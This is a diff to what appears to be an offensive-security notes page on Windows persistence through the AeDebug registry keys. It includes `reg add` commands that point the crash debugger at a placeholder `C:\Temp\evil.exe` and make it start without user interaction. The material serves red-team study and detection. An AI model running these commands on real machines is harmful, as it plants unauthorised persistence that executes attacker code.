@@ -10,30 +10,27 @@ The executable in the Debugger property is run when a process crashes. Gained ac
 
 ## Practice
 
-{% hint style="success" %}
-Registry entries under `HKU/HKCU` will only apply to the user.\
-Registry entries under `HKLM` will apply to everyone
+{% hint style="danger" %}
+By editing AEDebug, the original debugger exe will not start
 {% endhint %}
 
 {% tabs %}
 {% tab title="AeDebug" %}
 You can run a malicious code instead of the debugger by editing `Auto` and `Debugger` values under following keys:
 
-* `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug`
-* `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug`
 * `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\AeDebug`
 * `HKCU\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\AeDebug`
 
 ```powershell
 # Starts without user interaction
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug" /v "Auto" /d 1
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug" /v "Auto" /t REG_SZ  /d "1"
 # Edit debugger
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug" /v "Debugger" /d "C:\Temp\evil.exe"
 
 #Or
 
 # Starts without user interaction
-reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\AeDebug" /v "Auto" /d 1
+reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\AeDebug" /v "Auto" /t REG_SZ /d "1"
 # Edit debugger
 reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\AeDebug" /v "Debugger" /d "C:\Temp\evil.exe"
 ```
@@ -43,3 +40,5 @@ reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\AeDebug" 
 ## Resources
 
 {% embed url="https://www.hexacorn.com/blog/2013/09/19/beyond-good-ol-run-key-part-4/" %}
+
+{% embed url="https://persistence-info.github.io/Data/aedebug.html" %}
